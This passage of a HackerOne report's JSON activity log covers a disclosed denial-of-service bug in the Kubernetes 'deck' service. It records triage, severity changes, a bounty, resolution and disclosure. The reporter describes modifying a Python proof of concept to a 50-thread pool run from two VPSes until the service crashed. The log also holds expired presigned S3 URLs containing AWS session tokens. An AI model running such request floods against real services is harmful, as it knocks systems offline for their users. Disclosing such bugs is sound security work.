Yut5tMZcbmJchXopaXhvm%2B4orW3DihHvyn7HD%2BiT1cpN9baXaycQzr%2B68J9MyG01Zce8VNQxPm5eRp7v9dtdfEQ9sF3yuOsWzUwY%2BTHCD7SIcVsQFrS5Z2L5Ux3CncTXxkqQVlNCyHTcJODpncVKfD7b6uHxsAmVawhDDZJgLpATJPpVIaGa0em09aEDUcT%2FuazJtx1N1gOr8ZYZSsD6LmJlT7xfEsyzeZ%2BC%2FQQSJKyYRebEtRjLR%2BsYz4MKD2jlXjj62sVdjHko29e6c4eso%2Fx8%2Bjrkj%2BYuyD88VzMWxszti4qHccB7%2Fr3%2BsDzDViZGLBjqlAc5vcHGjagoOTjMDz6VCxHAyKKMhBY%2F4ksl1iKt3Mkg6KIb8dD7WB3B5bRwalHdLpA6q%2F0HyHwVC3k8nRLkVacoHC%2BTnF8IsDYgQMa3VWvq9UB5BqCGPwIE9Smv%2FlQf6eGWyrcOO%2Brsi6UGSaKxoz3eFt2y8zMnz71sdDkZshTNAZoB15M%2BSMQApjyeteOn3dhbojlsBvMBhOE%2FWaBGY2zXmhSJaSA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=4b5da1c701bdafd039ac7ef9432b89625835855a113dc9ddcfa77473d3d9db71"}],"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7587801,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-04-08T20:22:33.266Z","updated_at":"2020-04-08T20:22:33.266Z","additional_data":{"old_severity":"Medium (5.3)","new_severity":"Medium (6.5)","old_severity_id":674572,"new_severity_id":685420},"actor":{"username":"tuxedo","cleared":false,"url":"/tuxedo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7587928,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-04-08T20:42:26.811Z","updated_at":"2020-04-08T20:42:26.811Z","additional_data":{"old_severity":"Medium (6.5)","new_severity":"Medium (4.3)","old_severity_id":685420,"new_severity_id":685445},"actor":{"username":"tuxedo","cleared":false,"url":"/tuxedo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7587937,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you @lazydog! I was able to validate your report, and have submitted it to the appropriate remediation team for review. You will be updated on the status of this report as soon as there is additional information to share. Please note that the status and severity are subject to change. ","automated_response":false,"created_at":"2020-04-08T20:44:55.238Z","updated_at":"2020-04-08T20:44:55.238Z","actor":{"username":"tuxedo","cleared":false,"url":"/tuxedo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7771066,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hi @lazydog - Thanks for your patience! We're not able to consistently reproduce this denial of service. If possible, can you please provide a different proof of concept and also include details regarding your testing machine? Thank you! ","automated_response":false,"created_at":"2020-04-23T17:07:12.572Z","updated_at":"2020-04-23T17:07:12.572Z","actor":{"username":"tuxedo","cleared":false,"url":"/tuxedo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":7777409,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Hi @tuxedo \ni create a new one powerfully vps, in my case the vps have dual-core and 8GB ram\ndetail  hardware:\n```\nArchitecture:        x86_64\nCPU op-mode(s):      32-bit, 64-bit\nByte Order:          Little Endian\nCPU(s):              2\nOn-line CPU(s) list: 0,1\nThread(s) per core:  2\nCore(s) per socket:  1\nSocket(s):           1\nNUMA node(s):        1\nVendor ID:           GenuineIntel\nCPU family:          6\nModel:               85\nModel name:          Intel(R) Xeon(R) Platinum 8269CY CPU @ 2.50GHz\nStepping:            7\nCPU MHz:             3100.004\nBogoMIPS:            6200.00\nHypervisor vendor:   KVM\nVirtualization type: full\nL1d cache:           32K\nL1i cache:           32K\nL2 cache:            1024K\nL3 cache:            36608K\nNUMA node0 CPU(s):   0,1\nFlags:               fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 ss ht syscall nx pdpe1gb rdtscp lm constant_tsc rep_good nopl cpuid tsc_known_freq pni pclmulqdq monitor ssse3 fma cx16 pcid sse4_1 sse4_2 x2apic movbe popcnt aes xsave avx f16c rdrand hypervisor lahf_lm abm 3dnowprefetch invpcid_single pti fsgsbase tsc_adjust bmi1 hle avx2 smep bmi2 erms invpcid rtm mpx avx512f avx512dq rdseed adx smap avx512cd avx512bw avx512vl xsaveopt xsavec xgetbv1 xsaves arat avx512_vnni\nroot@iZj6cf1dvfto1qim9thbpxZ:~# free -m\n              total        used        free      shared  buff/cache   available\nMem:           7833          77        7516           2         238        7520\nSwap:             0           0           0\n```\ni just modify the python poc set threadpool size to 50. use two vps use poc file to request the deck service. Final the deck is crashed.\n```\n    p = Pool(50)\n    r = range(50)\n```\nI think this process is slow,but it is effective.\n{F801761}\n{F801762}\n{F801763}\n{F801764}","automated_response":false,"created_at":"2020-04-24T06:08:21.413Z","updated_at":"2020-04-24T06:08:21.413Z","actor":{"username":"lazydog","cleared":false,"url":"/lazydog","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/WEGv54Sh14TngEaGv3g6nXvf/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":801764,"filename":"deck_crash.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/buYdwhDQJFP6eJSt9bR3JQpj?response-content-disposition=attachment%3B%20filename%3D%22deck_crash.png%22%3B%20filename%2A%3DUTF-8%27%27deck_crash.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYC7ZV3WT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153258Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIDrMLp4%2BWn0RnMngqqBOAomCU8GWEnyzbfeWXMTkRqdkAiEAmbCt%2FtYvzimCcqsBY5T%2BAP6C1koJvsZIEr7pm24tsEAqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHO5iuzPFsJ4aK7KmSrXA43fG9ZExUYtmldfJFAHkWRlov9q%2FHMMPiqI7JWoul8iB2lnCe0Z8UD9oM5cfjZfhntNLx94myZGJfeT24YbqZ%2BCsOqn%2BPXRlK7VWqoq1AV8zdBtboSY1qGlF1yW0h8xQvR1G807ShHTgDzCxdIUl0y2PUXdt%2BRNIlHckLFzjBfbJBmGFikh%2B68wwr3qhH%2BRekBJT8dRJqkMmVmJIoL4rn3y%2FCM010RJxL86Xuoat%2BrN046smSjkfceh4bPaJkOADf33dP%2FBliSDcBjoMG74ZFHPAmgnqoN439xdfqhUpIPqNFrcRU1WpQhc12VYut5tMZcbmJchXopaXhvm%2B4orW3DihHvyn7HD%2BiT1cpN9baXaycQzr%2B68J9MyG01Zce8VNQxPm5eRp7v9dtdfEQ9sF3yuOsWzUwY%2BTHCD7SIcVsQFrS5Z2L5Ux3CncTXxkqQVlNCyHTcJODpncVKfD7b6uHxsAmVawhDDZJgLpATJPpVIaGa0em09aEDUcT%2FuazJtx1N1gOr8ZYZSsD6LmJlT7xfEsyzeZ%2BC%2FQQSJKyYRebEtRjLR%2BsYz4MKD2jlXjj62sVdjHko29e6c4eso%2Fx8%2Bjrkj%2BYuyD88VzMWxszti4qHccB7%2Fr3%2BsDzDViZGLBjqlAc5vcHGjagoOTjMDz6VCxHAyKKMhBY%2F4ksl1iKt3Mkg6KIb8dD7WB3B5bRwalHdLpA6q%2F0HyHwVC3k8nRLkVacoHC%2BTnF8IsDYgQMa3VWvq9UB5BqCGPwIE9Smv%2FlQf6eGWyrcOO%2Brsi6UGSaKxoz3eFt2y8zMnz71sdDkZshTNAZoB15M%2BSMQApjyeteOn3dhbojlsBvMBhOE%2FWaBGY2zXmhSJaSA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=2d1f8d2063257dd42811a0a361d395f48398af360ca15e5b53da5b047ded5fa6"},{"id":801763,"filename":"mempercent90.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/HKMDcqac4yKnZdMmiBKEWf9Q?response-content-disposition=attachment%3B%20filename%3D%22mempercent90.png%22%3B%20filename%2A%3DUTF-8%27%27mempercent90.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYC7ZV3WT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153258Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIDrMLp4%2BWn0RnMngqqBOAomCU8GWEnyzbfeWXMTkRqdkAiEAmbCt%2FtYvzimCcqsBY5T%2BAP6C1koJvsZIEr7pm24tsEAqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHO5iuzPFsJ4aK7KmSrXA43fG9ZExUYtmldfJFAHkWRlov9q%2FHMMPiqI7JWoul8iB2lnCe0Z8UD9oM5cfjZfhntNLx94myZGJfeT24YbqZ%2BCsOqn%2BPXRlK7VWqoq1AV8zdBtboSY1qGlF1yW0h8xQvR1G807ShHTgDzCxdIUl0y2PUXdt%2BRNIlHckLFzjBfbJBmGFikh%2B68wwr3qhH%2BRekBJT8dRJqkMmVmJIoL4rn3y%2FCM010RJxL86Xuoat%2BrN046smSjkfceh4bPaJkOADf33dP%2FBliSDcBjoMG74ZFHPAmgnqoN439xdfqhUpIPqNFrcRU1WpQhc12VYut5tMZcbmJchXopaXhvm%2B4orW3DihHvyn7HD%2BiT1cpN9baXaycQzr%2B68J9MyG01Zce8VNQxPm5eRp7v9dtdfEQ9sF3yuOsWzUwY%2BTHCD7SIcVsQFrS5Z2L5Ux3CncTXxkqQVlNCyHTcJODpncVKfD7b6uHxsAmVawhDDZJgLpATJPpVIaGa0em09aEDUcT%2FuazJtx1N1gOr8ZYZSsD6LmJlT7xfEsyzeZ%2BC%2FQQSJKyYRebEtRjLR%2BsYz4MKD2jlXjj62sVdjHko29e6c4eso%2Fx8%2Bjrkj%2BYuyD88VzMWxszti4qHccB7%2Fr3%2BsDzDViZGLBjqlAc5vcHGjagoOTjMDz6VCxHAyKKMhBY%2F4ksl1iKt3Mkg6KIb8dD7WB3B5bRwalHdLpA6q%2F0HyHwVC3k8nRLkVacoHC%2BTnF8IsDYgQMa3VWvq9UB5BqCGPwIE9Smv%2FlQf6eGWyrcOO%2Brsi6UGSaKxoz3eFt2y8zMnz71sdDkZshTNAZoB15M%2BSMQApjyeteOn3dhbojlsBvMBhOE%2FWaBGY2zXmhSJaSA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c4aff3c6b79a22727cbe8e9cbcc4af82bbc0310e2fd6d213a5ef14325dd00afb"},{"id":801762,"filename":"mempercent80.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/FDNTFVbD4g1D2iHYdbeG4B6o?response-content-disposition=attachment%3B%20filename%3D%22mempercent80.png%22%3B%20filename%2A%3DUTF-8%27%27mempercent80.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYC7ZV3WT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153258Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIDrMLp4%2BWn0RnMngqqBOAomCU8GWEnyzbfeWXMTkRqdkAiEAmbCt%2FtYvzimCcqsBY5T%2BAP6C1koJvsZIEr7pm24tsEAqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHO5iuzPFsJ4aK7KmSrXA43fG9ZExUYtmldfJFAHkWRlov9q%2FHMMPiqI7JWoul8iB2lnCe0Z8UD9oM5cfjZfhntNLx94myZGJfeT24YbqZ%2BCsOqn%2BPXRlK7VWqoq1AV8zdBtboSY1qGlF1yW0h8xQvR1G807ShHTgDzCxdIUl0y2PUXdt%2BRNIlHckLFzjBfbJBmGFikh%2B68wwr3qhH%2BRekBJT8dRJqkMmVmJIoL4rn3y%2FCM010RJxL86Xuoat%2BrN046smSjkfceh4bPaJkOADf33dP%2FBliSDcBjoMG74ZFHPAmgnqoN439xdfqhUpIPqNFrcRU1WpQhc12VYut5tMZcbmJchXopaXhvm%2B4orW3DihHvyn7HD%2BiT1cpN9baXaycQzr%2B68J9MyG01Zce8VNQxPm5eRp7v9dtdfEQ9sF3yuOsWzUwY%2BTHCD7SIcVsQFrS5Z2L5Ux3CncTXxkqQVlNCyHTcJODpncVKfD7b6uHxsAmVawhDDZJgLpATJPpVIaGa0em09aEDUcT%2FuazJtx1N1gOr8ZYZSsD6LmJlT7xfEsyzeZ%2BC%2FQQSJKyYRebEtRjLR%2BsYz4MKD2jlXjj62sVdjHko29e6c4eso%2Fx8%2Bjrkj%2BYuyD88VzMWxszti4qHccB7%2Fr3%2BsDzDViZGLBjqlAc5vcHGjagoOTjMDz6VCxHAyKKMhBY%2F4ksl1iKt3Mkg6KIb8dD7WB3B5bRwalHdLpA6q%2F0HyHwVC3k8nRLkVacoHC%2BTnF8IsDYgQMa3VWvq9UB5BqCGPwIE9Smv%2FlQf6eGWyrcOO%2Brsi6UGSaKxoz3eFt2y8zMnz71sdDkZshTNAZoB15M%2BSMQApjyeteOn3dhbojlsBvMBhOE%2FWaBGY2zXmhSJaSA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b0f81ae452610cb1a8231831f8c668ee9afd02b2169b9691d910970dce01d96d"},{"id":801761,"filename":"mempercent50.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/b1oe9zTNuF27Z6mQYLUZ5ReY?response-content-disposition=attachment%3B%20filename%3D%22mempercent50.png%22%3B%20filename%2A%3DUTF-8%27%27mempercent50.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQYC7ZV3WT%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153258Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIDrMLp4%2BWn0RnMngqqBOAomCU8GWEnyzbfeWXMTkRqdkAiEAmbCt%2FtYvzimCcqsBY5T%2BAP6C1koJvsZIEr7pm24tsEAqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDHO5iuzPFsJ4aK7KmSrXA43fG9ZExUYtmldfJFAHkWRlov9q%2FHMMPiqI7JWoul8iB2lnCe0Z8UD9oM5cfjZfhntNLx94myZGJfeT24YbqZ%2BCsOqn%2BPXRlK7VWqoq1AV8zdBtboSY1qGlF1yW0h8xQvR1G807ShHTgDzCxdIUl0y2PUXdt%2BRNIlHckLFzjBfbJBmGFikh%2B68wwr3qhH%2BRekBJT8dRJqkMmVmJIoL4rn3y%2FCM010RJxL86Xuoat%2BrN046smSjkfceh4bPaJkOADf33dP%2FBliSDcBjoMG74ZFHPAmgnqoN439xdfqhUpIPqNFrcRU1WpQhc12VYut5tMZcbmJchXopaXhvm%2B4orW3DihHvyn7HD%2BiT1cpN9baXaycQzr%2B68J9MyG01Zce8VNQxPm5eRp7v9dtdfEQ9sF3yuOsWzUwY%2BTHCD7SIcVsQFrS5Z2L5Ux3CncTXxkqQVlNCyHTcJODpncVKfD7b6uHxsAmVawhDDZJgLpATJPpVIaGa0em09aEDUcT%2FuazJtx1N1gOr8ZYZSsD6LmJlT7xfEsyzeZ%2BC%2FQQSJKyYRebEtRjLR%2BsYz4MKD2jlXjj62sVdjHko29e6c4eso%2Fx8%2Bjrkj%2BYuyD88VzMWxszti4qHccB7%2Fr3%2BsDzDViZGLBjqlAc5vcHGjagoOTjMDz6VCxHAyKKMhBY%2F4ksl1iKt3Mkg6KIb8dD7WB3B5bRwalHdLpA6q%2F0HyHwVC3k8nRLkVacoHC%2BTnF8IsDYgQMa3VWvq9UB5BqCGPwIE9Smv%2FlQf6eGWyrcOO%2Brsi6UGSaKxoz3eFt2y8zMnz71sdDkZshTNAZoB15M%2BSMQApjyeteOn3dhbojlsBvMBhOE%2FWaBGY2zXmhSJaSA%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=3654841c10015c30b444abc641fc40bf458e6fc87254e22052523176a8b9ddff"}],"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7842598,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you @lazydog!","automated_response":false,"created_at":"2020-04-29T20:30:07.645Z","updated_at":"2020-04-29T20:30:07.645Z","actor":{"username":"tuxedo","cleared":false,"url":"/tuxedo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":8043493,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2020-05-19T04:12:26.380Z","updated_at":"2020-05-19T04:12:26.380Z","actor":{"url":"/kubernetes","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/386/486f4380e09776d05a912ca9f46be23f72fe8197_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Kubernetes"}},"bounty_amount":"250.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"kubernetes","collaborator":{"username":"lazydog","url":"/lazydog"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9369833,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @lazydog,\n\nThanks again for the report. This has now been fixed and rolled out, so I am closing this report as `Resolved`. ","automated_response":false,"created_at":"2020-09-29T21:38:20.035Z","updated_at":"2020-09-29T21:38:20.035Z","actor":{"username":"tuxedo","cleared":false,"url":"/tuxedo","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/9G6pgB95of3ikt3prqQunAfD/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":true,"hackerone_employee":true},"reporter":{"username":"lazydog","url":"/lazydog"},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":true},{"id":10318841,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Hi,\nLet us disclosure this?\n\nbest regards,\n@lazydog","automated_response":false,"created_at":"2021-01-10T05:26:30.674Z","updated_at":"2021-01-10T05:26:30.674Z","first_to_agree":true,"actor":{"username":"lazydog","cleared":false,"url":"/lazydog","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/WEGv54Sh14TngEaGv3g6nXvf/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10579724,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-02-04T19:00:03.999Z","updated_at":"2021-02-04T19:00:03.999Z","actor":{"username":"cjcullen","cleared":false,"url":"/cjcullen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10579725,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-02-04T19:00:04.278Z","updated_at":"2021-02-04T19:00:04.278Z","actor":{"username":"cjcullen","cleared":false,"url":"/cjcullen","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"kubernetes","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}